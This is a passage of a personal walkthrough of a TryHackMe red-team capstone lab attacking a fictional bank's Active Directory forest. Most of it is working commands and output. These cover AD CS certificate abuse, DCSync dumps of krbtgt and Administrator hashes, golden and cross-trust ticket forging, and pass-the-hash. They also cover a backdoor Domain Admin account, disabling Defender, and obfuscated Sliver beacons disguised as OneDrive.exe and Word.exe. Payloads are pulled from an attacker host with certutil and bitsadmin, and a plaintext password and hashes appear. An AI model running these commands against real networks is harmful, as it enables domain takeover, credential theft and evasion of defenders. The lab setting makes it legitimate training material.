      bT3WdbUUDLo8gBg7qRZOrycpQRzAeUQ6nezxhhIQAIW4rfn9qmTNyftt2TNyNJnAAqbKg6kKgWKr68vP
      V9EXUUXoIxapxtpFLPfXSS0WINBzNdifQV5Ifgy+ysjQZhUM0PQwGhNT6U/LoonjKlX5QLxsKo6hFK2u
      deii8d/6iiS2eMWo6rDcGa6Sr0F5Wx0v/BPfjaai7L1Td0ZikGB8e+jIeNPXcs5XXHF6EDezVQgl9QTS
      ZG/BQSvlKC1+uXjnPP9WBMjkaN2Dt02QE8SEKe6v2FA4Z/HMgLC8ZV8wHCrt+Z19HU0isGXaDz8N4p1v
      QgRWVOD3VVOy0k6YeFQ2NkEIH+/yL+ZhI2nZz8X3pbM5n4yJfwqyLu93HnnKPpmbOv6IVvfajS7Rh1ch
      jUuL04ljK/YPELr60LTLTxBCS6C4JYODNGnAhxGYmPKN29BFzvnai3gZlAPUflJYP7RqQ3PoXKX3Qiyt
      lZHDNIQGAXMqxquK/eF6254bVFDcoxeO82UeFvM5qOnnd0nvSLDp0klhFPE9eeYxb9kN8PMoUD4ss0V8
      wJ/m2h0bW7qVYDIJcMeOGVjoXg9GJIvFmIIebrjZVjjsx+2zCExuaQWBHJDrLcGdsQgqDWFxOceT9qK2
      uggpJRMC5uaNnbvOAcUwgwlze7T/iu6hENlWuvJbdKfEeURJnVw3AysDR28AVTFl98c2eiCYXc1VmQWr
      NS37EB6rSy55zHtVo4IBGTCCARWgAwIBAKKCAQwEggEIfYIBBDCCAQCggf0wgfowgfegKzApoAMCARKh
      IgQgtdPB4js8dV3dGGzH6AEgXbVLFLkN3eve2UaBGF8KUGKhFRsTQ09SUC5USEVSRVNFUlZFLkxPQ6Ib
      MBmgAwIBAaESMBAbDnQwX2pvc2guc3V0dG9uowcDBQBA4AAApBEYDzIwMjMwNTI4MTIwMzM5WqURGA8y
      MDIzMDUyODEyMDMzOVqmERgPMjAyMzA1MjgyMjAzMzlapxEYDzIwMjMwNjA0MTIwMzM5WqgVGxNDT1JQ
      LlRIRVJFU0VSVkUuTE9DqSgwJqADAgECoR8wHRsGa3JidGd0GxNjb3JwLnRoZXJlc2VydmUubG9j



[*] Printing a command to recreate a ticket containing the information used within this ticket

c:\windows\system32\notepad.exe golden /aes256.116.F996A627A04466DA18A4C09D0D7E9A26EDF5667518EE1AF1E21DF7E88E055 /user:t0_josh.sutton /id:1853 /pgid:513 /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /pwdlastset:"2/14/2023 5:40:31 AM" /minpassage:1 /displayname:"Josh Sutton" /netbios:CORP /groups:.116.513 /dc:CORPDC.corp.thereserve.loc /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD
```

Next thing I wanted to do is create the ultimate User from this ticket so that I am not other ruining anyone else on the network. 
![](dcsyncisgreaterthanmsreed.png)

We need login to the DC and dc-sync another DC as that looks normal! 

## Full Compromise of Parent Domain

Certipy - 101 with [Alh4zr3d](https://www.twitch.tv/videos/1829218217) - I used [Kali version - certifpy-ad](https://www.kali.org/tools/certipy-ad/)
```bash
# This worked a week ago
proxychains certipy-ad find -u 'lisa.moore' -p 'Scientist2006' -dc-ip 10.200.116.102
# This did not work
proxychains4 certipy-ad find -u 'mohammad.ahmed@corp.thereserve.loc' -p 'Password1!' -stdout -enabled -dc-ip 10.200.116.102
```
I got this error
![](certipyerror.png)
And with the pip3 version
![](pip3versionofcertipy.png)

Certificate Authority are setup to sign encryption, authentication, emails, TLS/SSL encrytion, governance and policy. PKI is Public Key infrastructure, Microsoft AD CS is the builtin PKI. Commonly used for generate SSL for internal certificates for internal websites.
![](selfsigncertificateimageforexplaination.png)

[Alh4zr3d](https://www.twitch.tv/videos/1829218217) discussed Web Enrollment is (Custom template) web-based builtin interface to enrollment, which uses NTLM authentication. Web Enrollment : Disabled - not real life, NTLM relay attack if we could. 
- Custom Templates
- Look at Enrollment Rights
- If we have get SYSTEM access on Server 1 then we DC because of the Enrollment rights.

EnrolleeSuppliesSubject can request as SERVER01 can add a domain administrator as we can add Subject Alt names. Subject Alt names helps the management of certificates, but we can then use this certificate can be used in a different domain.

Extended Key Usage: defines authentication key usage
- if set to `Any Purpose` which is instant DA.  

svcBackups@corp.thereserve.loc:q9nzssaFtGHdqUV3Qv6G

```python
# It will always timeout the first time!
# -target must be the AD CS server
# -template must be the actually name not the display name 
proxychains4 certipy-ad req -u 'SERVER1$@corp.thereserve.loc' -hashes 'aad3b435b51404eeaad3b435b51404ee:ee0b312ba706c567436e6a9e08fa3951' -ca 'THERESERVE-CA' -target 'CORPDC.corp.thereserve.loc' -template 'WebManualEnroll' -upn 'Administrator@corp.thereserve.loc' -dns 'CORPDC.corp.thereserve.loc' -dc-ip 10.200.116.102 -ns 10.200.116.102
# First time will always timeout 
openssl x509 -in administrator_corpdc.pfx -text -noout
```

DNS issues persist, but the room creator states we could do this all manually as Al had indicated from his upcoming course, via RDPing in. then apparently it will always timeout the first time:
![1080](adcsexploit.png)

```bash
proxychains4 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx administrator_corpdc.pfx

'administrator@corp.thereserve.loc': aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e
```

Because of PKInit you will receive the NTLM hashes from doing a S4U attack.
![](wowdchash.png)

am03bam4n - Out of interest, have you exploited this AD CS issue when a DC does not have a DC Kerberos cert installed?
SChannel is a created LDAP session with a certificate.


```bash
export KRB5CCNAME=/home/kali/RedTeamCapStoneChallenge/data/administrator.ccache

proxychains impacket-wmiexec -k -no-pass -dc-ip 10.200.116.102 Administrator@CORPDC.corp.thereserve.loc
```
![](wmiexecontothedc.png)

#### Another Reset later..

I wondered why I could download from the DC and then I guessed someone before me had reconfigure the firewall, so I added a few [rules](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior). Not Opsec Safe but I need my DA account
```powershell
netsh advfirewall firewall add rule name= "Open Port 8443" dir=in action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name= "Open Port 8443" dir=out action=allow protocol=TCP localport=8443
netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\Word.exe" enable=yes
```

On the DC , I understand this is not Opsec safe, but I want flags and I have time constraints
```powershell
# Beacon Drop
# Either via
certutil.exe -urlcache -split -f http://10.50.113.184:8443/DC1/Word.exe Word.exe
# or Share
impacket-smbserver share $(pwd) -smb2support
xcopy \\10.50.113.184\Share\Word.exe .
```


Possibly the most hacky bad sysadmin or red team reoccurring rake-to-facer  
```powershell
# Creating the ultimate Domain Admin user so I will use a Sliver shell
import-module ActiveDirectory
# Check for groups you what
Get-ADGroup -filter *
# $pass = convertto-securestring -asplaintext -force -string "da15ADMIN#Nvm"

New-ADUser -Name 'NVM2'
# Forgot to set a password ..
Set-ADAccountPassword -Identity NVM2 -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
# Note to self Nesting and each group can cancel out, each other just because you can does not mean you should, Subscriber for AZ or DA is enough, chill!
Add-ADGroupMember -Identity "Domain Admins" -Members "NVM2"
Enable-ADAccount -Identity NVM2
net localgroup "Administrators" NVM2 /add 
net user NVM2 /dom
# Update the Group Policy
gpupdate /force
```

The horror...
![](powerlevelisover9000.png)

In the face BadOpsec of this I want to also make:
- Silver Tickets
- Golden Tickets
- Golden Certs if time.

In interim research and resets, rebuilds and redeployment I documented... 

#### Manual CS Abuse

Unpausing [Alh4zr3d](https://www.twitch.tv/videos/1829218217) to document manual AD CS abuse
Make a new Certificate with an RDP session - From [Alh4zr3d stream](https://www.twitch.tv/videos/1829218217) 
- `Search 'MMC' -> File -> Add/Remove Snap-in -> Certificate -> Add -> $account -> 'Snap-in always manage:' Local computer -> Ok`
- Find from `MMC` main: `Console Root -> Certificate (Local Computer) -> Trusted Root Certification Authority\ Certificates -> $yourCertInThisList -> [Left Click] to view, Edit Properties..., Copy to File...`
- Request a new Certificate `Console Root -> Certificate (Local Computer)\Personal -> [Right Click] Request New Certificate... -> Next -> Next (Configured by you or Configured by your administrator) -> Click to Configure settings`
	-  Subject Tab
		- Subject Name:
			- Type
			- Value
		- Alternative Name
			- Type
			- Value
	-  Private Key Tab
		- `Key Options -> [Tick] Make Private Key Exportable`  
- `Enroll`  after selecting Certificate on the Request Certificates 
- Export Certificate with `[Right Click] on Certificate -> All Tasks -> Export`
	- Export with Private Key - You need to Private Key
		- Make sure you have selected the option to make Private Key exportable in the `Private Key Tab`!
	- Disable Certificate Privacy
	- Create a Password
	- Export

Get it back to your box somehow
```bash
certipy-ad cert -export -pfx ./admincCert.pfx -password "yourpassword" -out "unprotected.pfx"
proxychains4 certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx unprotected.pfx
```

Disable Restricted-Administrator settings to allow for RDP. Not Opsec safe if not obvious
```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Export the certificate manual GUI non-usb-Mr-Robot-style  and either use C\# [GhostPack/ForgeCert](https://github.com/GhostPack/ForgeCert) or Python [pyForgeCert](https://github.com/Ridter/pyForgeCert) to forge certificate
```bash
python3 pyForgeCert.py -i $infile -pfx -p 'PasswordGoesHere' -s 'SubjectNameGoesHere' -a 'AltNameGoesHere' -o $outputPath 
```

Then export the certificate and authenticate
```bash
certipy-ad cert -export -pfx $forgedAdmin.pfx -password "yourpassword" -out "unprotected.pfx"
certipy-ad auth -dc-ip 10.200.116.102 -ns 10.200.116.102 -pfx unprotected.pfx
```


[Tyler](https://www.youtube.com/watch?v=xzxpn6k7OIQ) demonstrates we could also use `evil-winrm` and the hash from the dc-sync to remote into the dc through pass-the-hash 
```bash
proxychains evil-winrm -i 10.200.116.102 -u Administrator -H 'd3d4edcc015856e386074795aea86b3e'
```

#### Catching up on Email

Messages from Am03baM4n
![](messagefromAmoebaman3.png)

Server Alert..
![](messagefromAmoebaman4.png)

Server Takeover
![](messagefromAmoebaman5.png)

DC has fallen
![](messagefromAmoebaman6.png)

#### Golden Tickets with Tyler

Domain Trust Exploitation

[Tyler](https://www.youtube.com/watch?v=Td_Krk1S3yg) did:
```powershell
proxychains4 xfreerdp /u:NVM2 /p:'p@ssw0rd1!' /v:10.200.116.102
Set-MpPreference -DisableRealTimeMonitoring $true
impacket-smbserver share $(pwd) -smb2support
xcopy \\10.50.113.184\Share\mimikatz.exe .
# And kerberoasted and Exploit the domain trust.
```

I have a sliver beacon on the DC with some serious capabilities so I tried various including the below
```go
// Smoother install
armory install -t 30 -c all  
// Inventory check
armory

c2tc-kerberoast roast *
// There is a svcEDR account which would be cool to try to be

// AD CS
sa-adcs-enum // Save in data sa-adcs-enum.out
// tried but failed
remote-adcs-request [flags] CA [template] [subject] [alt-name] [Install] [Machine]
```

#### Alh4zr3d's Try Harder Tuesday

[Alh4zr3d](https://www.twitch.tv/videos/1833475098)

Domain Trust Typology:
- Inbound - Domain A  is trusted by Domain B (Domain A gains access to resources in B) 
- Outbound - Domain A trust is outbound to another Domain B (Domain B gains access to resources in A) 
- Bidirectional - Both Domains A and B trust one another both gains access to resources in each other 
- [Transitive](https://learn.microsoft.com/en-us/azure/active-directory-domain-services/concepts-forest-trust) - *"Transitivity determines whether a trust can be extended outside of the two domains with which it was formed.
	- *A transitive trust can be used to extend trust relationships with other domains.*
	- *A non-transitive trust can be used to deny trust relationships with other domains.*"

By default when setting up a parent child domain there is a bidirectional.

[Diamond Tickets](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/diamond-ticket) are forged online, which is good for stealth legitimate traffic in logical timeline. 
- Requires krbtgt hash.
1. Request regular user TGT
2. Decrypt
3. Modify 

Golden Tickets for a DC out of nowhere it any EDR - like Crowd Strike definitely alerts on it.  

[Sapphire tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire) 

IoC: `wmic` mounts and writes output to `ADMIN$` share by default.
```bash
# Choose a share and does not execute cmd.exe with no output
-share $SHARE -silentcommand
```


```bash
proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.116.102 -u 'NVM2' -p 'p@ssw0rd1!'
```


How to traverse a Bidirectional trust.
![](bidreictionaltrust.png)

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
```

```powershell
# Domain SID for THERESERVE.LOC
S-1-5-21-1255581842-1300659601-3764024703
# Domain SID for CORP.THERESERVE.LOC
S-1-5-21-170228521-1485475711-3199862024
# Enterprise Admins SID
S-1-5-21-1255581842-1300659601-3764024703-519
# This most "normal" krbtgt hash
dcsync-dump.hashes.ntds.kerberos:krbtgt:aes256-cts-hmac-sha1-96.116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055
dcsync-dump.hashes.ntds.kerberos:krbtgt:aes128-cts-hmac-sha1-96:7b3bb3c8cb4d2088bcf66834e1ee25d7
dcsync-dump.hashes.ntds.kerberos:krbtgt:des-cbc-md5:4c7f49bc8c43ae5b
dcsync-dump.hashes.ntds:krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::
# Administrator Hash
dcsync-dump.hashes.ntds:Administrator:500:aad3b435b51404eeaad3b435b51404ee:d3d4edcc015856e386074795aea86b3e

ticketer.py -request -domain 'DOMAIN.FQDN' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'

# Exploit the SID history
proxychains4 impacket-ticketer -request -domain 'CORP.THERESERVE.LOC' -user 'Administrator' -hashes 'd3d4edcc015856e386074795aea86b3e:d3d4edcc015856e386074795aea86b3e' -aesKey .116.f996a627a04466da18a4c09d0d7e9a26edf5667518ee1af1e21df7e88e055' -nthash 0c757a3445acb94a654554f3ac529ede -domain-sid 'S-1-5-21-1255581842-1300659601-3764024703' -user-id '500' -groups '512,513,518,519,520' 'Administrator' -dc-ip 10.200.116.102 -extra-sid 'S-1-5-21-170228521-1485475711-3199862024-519'
# PreAuth failed - possibly some hash value has been altered.

.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519
```

Because of potential issues with changes made by others users on this reset. I went away thinking I still really wanted to try both `rubeus` and `impacket-ticketer`, but I am going to need to just use `mimikatz`  
```go
// Perform S4U constrained delegation abuse across domains:

Rubeus.exe s4u /user:USER </rc4:HASH | /aes256:HASH> [/domain:DOMAIN] </impersonateuser:USER | /tgs:BASE64 | /tgs:FILE.KIRBI> /msdsspn:SERVICE/SERVER /targetdomain:DOMAIN.LOCAL /targetdc:DC.DOMAIN.LOCAL [/altservice:SERVICE] [/dc:DOMAIN_CONTROLLER] [/nowrap] [/self] [/nopac]
```


![](enterprisetargetadmins.png)

#### Returning to overcome other users and time

From a [XCT Wutai](https://www.youtube.com/watch?v=ekep6_x0iQM&pp=ygUJeGN0IFd1dGFp)  video I was introduced to `execute-assembly` and what that actually command actually entails. [Dominic Breuker](https://dominicbreuker.com/post/learning_sliver_c2_09_execute_assembly/) explains `execute-assembly` runs any .NET assembly as a executable or DLL completely in memory either in a:
- Sacrificial Process 
- Implant process
A .NET assembly is converted to position-independent shell code with [Donut](https://github.com/thewover/donut) then injected into target process; for in-process execution, a library called [go-clr](https://github.com/Ne0nd0g/go-clr) is used instead of [Donut](https://github.com/thewover/donut) .  
```go
execute-assembly -s -i $localpath/Tool.exe -- -$flagsAndArgsOfTool
```

```
Administrator : 0ee3d5c856f5a3d36986fbe3193e13d3
krbtgt : 0c757a3445acb94a654554f3ac529ede
```

```
rubeus asktgs /ticket:C:\nvm\.kirbi 
/service: service type [cifs/mcorpdc.moneycorp.local]   
/dc: domain controller [mcorp-dc.moneycorp.local]   
/ptt**
```

[harmj0y's](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/) Domain Trust Attack Strategy
1) Enumerate all trusts 
2) Enumerate all users/groups/computers that either:
	- Have access to resources
	- Are in groups or have users from another domain
3) Perform targeted account compromise 

Enumerate with: Bloodhound, .NET methods,  Win32API, LDAP, PowerView.ps1

[snovvcrash.rocks](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/attack-trusts)
```powershell
# Get Child domain FQDN
$env:userdnsdomain
# Get Forest Object
PV2 > Get-NetForest [-Forest megacorp.local]
PV3 > Get-Forest [-Forest megacorp.local]
# Get all domains in a forest:
PV2 > Get-NetForestDomain [-Forest megacorp.local]
PV3 > Get-ForestDomain [-Forest megacorp.local]
# Enumerate trusts for current domain via .NET 
nltest /trusted_domains
# Enumerate trusts via Win32 API (PowerView):
PV2 > Get-NetDomainTrust [-Domain megacorp.local] | ft
PV3 > Get-DomainTrust -API [-Domain megacorp.local] | ft
# Enumerate trusts via LDAP (PowerView):
PV2 > Get-NetDomainTrust -LDAP [-Domain megacorp.local] | ft
PV3 > Get-DomainTrust [-Domain megacorp.local] | ft
```

SIDHistory/ExtraSIDs hopping
```powershell
netdom.exe trust corp.thereserve.loc /domain:thereserve.loc /quarantine
```

![](harmj0yandsnovvcrashattackingaddomaintrusts.png)

Create a Cross-trust Golden ticket 

Get Child domain FQDN:
```powershell
PS > $env:userdnsdomain
```

Child domain's DC machine account and its RID:
```powershell
PV2 > (Get-NetComputer -ComputerName DC01.child.megacorp.local -FullData | select ObjectSID).ObjectSID
PV3 > (Get-DomainComputer DC01.corp.megacorp.local | select ObjectSID).ObjectSID
```

Get child domain SID
```powershell
PV > Get-DomainSID
```

SID of the parent domain
```powershell
PS > (New-Object System.Security.Principal.NTAccount("megacorp.local","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
```

Create cross-trust golden ticket
```powershell
# mimikatz
kerberos::golden /domain:child.megacorp.local /user:DC01$ /id:1337 /groups:516 /sid:S-1-5-21-4266912945-3985045794-2943778634 /sids:S-1-5-21-2284550090-12.116.7427-1204316795-516,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt [/startoffset:-10 /endin:60 /renewmax:10080]
```

DC Sync - this went wrong because I am not targeting the correct domains
```powershell
lsadump::dcsync /user:thereserve.loc\krbtgt /domain:thereserve.local
ERROR kull_m_net_getDC ; DsGetDcName: 1355
ERROR kuhl_m_lsadump_dcsync ; Domain Controller not present
```

This then becomes for RTCC as we are going from parent to:
```powershell
# Parent domain
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name
local
# THERESERVE.LOC

Get-DomainSID
# S-1-5-21-170228521-1485475711-3199862024
(New-Object System.Security.Principal.NTAccount("thereserve.loc","krbtgt")).Translate([System.Security.Principal.SecurityIdentifier]).Value
# S-1-5-21-1255581842-1300659601-3764024703-502

# mimikatz
kerberos::golden /domain:thereserve.loc /user:NVM2 /id:1337 /groups:516 /sid:S-1-5-21-170228521-1485475711-3199862024 /sids:S-1-5-21-1255581842-1300659601-3764024703-502,S-1-5-9 /krbtgt:00ff00ff00ff00ff00ff00ff00ff00ff /ptt [/startoffset:-10 /endin:60 /renewmax:10080]

(Get-DomainComputer ROOTDC.thereserve.loc | select ObjectSID).ObjectSID
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest())[0].RootDomain.Name

```

Then [Alh4zr3d started streaming](https://www.twitch.tv/alh4zr3d). Whom was on a mission to finish this before his other commitments and the previous stream I had not finished he ran into issues. With time to finish this not on my side and people I learnt of:
```powershell
# Troll in the network!!! 
# Change the keyboard layout 
Set-WinUserLanguageList -Force 'en-US'
```


## Full Compromise of BANK Domain

I decided the best thing for me completing this is to showcase a write-up from the hack smarter community [https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge](https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge). Given the time left and the limited time I even have. I still think that completion and exploration is possible, I just do not risk of no finishing before the time limit due to trying to be as stealthy or thorough as possible. This lab and what I have put in has already been very rewarding and I prefer to dump a lot of time to getting the most out of the lab and going beyond root especially in labs like this than speeding through and not retreading steps or researching sections or questioning what other things I could do or how does IoC work. 

Sliver Expansion prep
```bash
mkdir ROOTDC JMP BANKDC

generate beacon -m 10.50.113.184:11015 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin
generate beacon -m 10.50.113.184:11016 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/JMP/JMP.bin
generate beacon -m 10.50.113.184:11017 -b http://10.50.113.184:8443 --arch amd64 --os windows -f shellcode -G --save /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin
# ScareCrow
sudo chown -R kali:kali * && chmod +rx *

/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ROOTDC.bin -Loader binary -domain google.com -obfu -Evasion KnownDLL 
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/BANKDC/BANKDC.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
/opt/ScareCrow/ScareCrow -I /home/kali/RedTeamCapStoneChallenge/Tools/JMP/JMP.bin -Loader binary -domain microsoft.com -obfu -Evasion KnownDLL 
# cd to  directory and build
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w"
# UPX!
upx *

mtls -L 10.50.113.184 -l 11015
mtls -L 10.50.113.184 -l 11016
mtls -L 10.50.113.184 -l 11017
```

While I recompile everything again re-watched the talk discussed in the SWIFT compromise section and this [Jake's Emulating the Adversary in Post-Exploitation at SANs Hackfest & Ranges Summit 2020](https://www.youtube.com/watch?v=VctxgiEoDUU). 
- We are inherently loss averse - spend more to avoid a loss than gain the same thing
- Better understand tangible things than intangible counterparts
- SEES - Explain and Estimate and Strategic Notice
- Never go Full Cyber
	- Locking out accounts
	- Anything that might destroy data or impact systems
	- Anything involving switching (Spanning Tree Protocols)
	- Actually exfiltrating sensitive, and especially regulated data 
	- Exploiting storage devices and controllers
	- Performing post-exploitation on hypervisors 
- Do no harm - you are a service
- Pivot to data the user already has access to
	- `net use` or `psdrive`
	- Recent documents
		- Windows Search terms
		- `reg query "hkcu\software\microsoft\windows\currentversion\explorer\recentdocs"`
- Hunt for the most sensitive documents - what highlights the biggest impact?
	- use `tika`  - https://github.com/apache/tika
- Target backups - say you download the back, but do not download the backup for packet economy, time and legal reasons
	- open iSCSI endpoints
- Compromise source code
	- Exfil source code
	- Add a backdoor
	- API keys and passwords
- Plant Web shells
- dump WIFI and VPN configurations
- Jake's favourite share - the weirdly named public share; these are created to dump data to bypass the lengthy time intralegally to creation of a security group for business-to-business contractors that need access.  

#### Continue to the final Flags today

Firstly had issues with another users on various subnets till I found one although my original ways to the CORPDC were main uninhibited, certutil as dropper was not working, but I just side step this with WindRM as I had begun reading the [0xb0b writeup](https://0xb0b.gitbook.io/writeups/tryhackme/red-team-capstone-challenge/full-compromise-of-parent-domain), which pointed this out.

Firstly a realisation already expressed that I failed to handle the domains correctly in my decision making
![](thecorrectadminaccount.png)

```powershell
import-module ActiveDirectory
New-ADUser -Name 'NVM'
Set-ADAccountPassword -Identity NVM -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "NVM"
Enable-ADAccount -Identity NVM
net localgroup "Administrators" NVM /add 
gpupdate /force

proxychains4 evil-winrm -u NVM -p 'p@ssw0rd1!' -i 10.200.116.102
Set-MpPreference -DisableRealTimeMonitoring $true
# For some reason certutil did not work so bitsadmin with altered syntax from the LOLBAS
# Which also does not worked but broke the webserver I was hosting it for some reason
bitsadmin.exe /transfer NewUpdate /Download /priority High http://10.50.113.184:8443/DC1/OneDrive.exe c:\programdata\NVM\OneDrive.exe
# So just
mkdir C:\programdata\nvm
upload /home/kali/RedTeamCapStoneChallenge/Tools/Tools/PowerView/PowerView.ps1 C:\programdata\NVM\PowerView.ps1
upload /home/kali/RedTeamCapStoneChallenge/Tools/mimikatz.zip C:\programdata\NVM\mimikatz.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/kekeo.zip C:\programdata\NVM\kekeo.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/Invoke-SMBExec.ps1 C:\programdata\NVM\Invoke-SMBExec.ps1

upload /home/kali/RedTeamCapStoneChallenge/Tools/DC1/OneDrive.exe C:\programdata\NVM\OneDrive.exe
expand-archive .\mimikatz.zip
expand-archive .\kekeo.zip
# get beacon
Start-Process C:\programdata\NVM\OneDrive.exe -WindowStyle Hidden
# This is here because I need to target the correct domains as well as datas gathering:
# Get-ADUser -Identity "Administrator" -Server rootdc.thereserve.loc
#  S-1-5-21-1255581842-1300659601-3764024703-500

# We need to impersonate the Administrator user on rootdc.thereserve.loc

Get-ADComputer -Identity "CORPDC"
# S-1-5-21-170228521-1485475711-3199862024-1009
# S-1-5-21-170228521-1485475711-3199862024-1009
Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
# S-1-5-21-1255581842-1300659601-3764024703-519
# S-1-5-21-1255581842-1300659601-3764024703-519
cd C:\programdata\nvm\mimikatz\x64\
.\mimikatz.exe
# Mimkatz 
# Remember to cycle through exfil and catagorise for data handling
privilege::debug
log
token::elevate
!+

lsadump::dcsync /user:corp\krbtgt
#  0c757a3445acb94a654554f3ac529ede
#  0c757a3445acb94a654554f3ac529ede
# Altered From https://tryhackme.com/room/exploitingad
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
# 0xb0b
kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt

# nvm/7ru7h
kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
```


![](krbtgtondc.png)
Then first golden ticket creation
![](goldenticketnumone.png)
Unfortunately this did not work for me possibly the other user on my lab network is using a different forge ticket to impersonate the administrator user and then psexecing into the rootdc or bankdc. I am being blocked by another user almost certainly. 

Prepping everything to power-through to dropping beacons on both `rootdc`, `jmp` and `bankdc` before anyone can block the way. It also seems like everyone is using the same way in.
```powershell
# Players changed a hash, beware
# Got hash for 'administrator@corp.thereserve.loc': # 
# aad3b435b51404eeaad3b435b51404ee:b199b5002b300e97a0d75cb18c0a43c0

import-module ActiveDirectory
New-ADUser -Name 'NVM'
Set-ADAccountPassword -Identity NVM -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
Add-ADGroupMember -Identity "Domain Admins" -Members "NVM"
Enable-ADAccount -Identity NVM
net localgroup "Administrators" NVM /add 
gpupdate /force

cd 
proxychains4 evil-winrm -u NVM -p 'p@ssw0rd1!' -i 10.200.116.102
Set-MpPreference -DisableRealTimeMonitoring $true


mkdir c:\programdata\nvm
upload /home/kali/RedTeamCapStoneChallenge/Tools/Tools/PowerView/PowerView.ps1 C:\programdata\NVM\PowerView.ps1
upload /home/kali/RedTeamCapStoneChallenge/Tools/mimikatz.zip C:\programdata\NVM\mimikatz.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/kekeo.zip C:\programdata\NVM\kekeo.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/DC1/OneDrive.exe C:\programdata\NVM\OneDrive.exe

netsh advfirewall firewall add rule name="nvm-the-beacon" dir=in action=allow program="C:\programdata\NVM\OneDrive.exe" enable=yes
Start-Process .\OneDrive.exe -WindowStyle Hidden
# upload to server beacon from here
upload /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/ .exe C:\programdata\NVM\.exe
# PsExec && SMBExec
upload /home/kali/RedTeamCapStoneChallenge/Tools/PSTools.zip
upload /home/kali/RedTeamCapStoneChallenge/Tools/
upload /home/kali/RedTeamCapStoneChallenge/Tools/chisel.exe

# Just incase
upload /home/kali/RedTeamCapStoneChallenge/Tools/ROOTDC/Powerpnt.exe C:\programdata\NVM\Powerpnt.exe

expand-archive .\mimikatz.zip
expand-archive .\PSTools.zip
expand-archive .\kekeo.zip

lsadump::dcsync /dc:rootdc.thereserve.loc /domain:thereserve.loc /user:S-1-5-21-1255581842-1300659601-3764024703-500

Get-ADComputer -Identity "CORPDC"
# 
Get-ADGroup -Identity "Enterprise Admins" -Server rootdc.thereserve.loc
# 

cd C:\programdata\nvm\mimikatz\x64\
.\mimikatz.exe
# Mimkatz 
# Remember to cycle through exfil and catagorise for data handling
privilege::debug
log
token::elevate
!+
# We are DA so
lsadump::dcsync /user:corp\krbtgt
lsadump::lsa /patch

# 
kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:<sid of the child dc> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
# Paste details into each from template above
kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024-1009 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt





.\Psexec64.exe \\rootdc.thereserve.loc powershell.exe

# this does not work
import-module ActiveDirectory
New-ADUser -Name 'NVM2_EA'
Set-ADAccountPassword -Identity NVM2_EA -NewPassword (ConvertTo-SecureString -AsPlainText "p@ssw0rd1!" -Force)
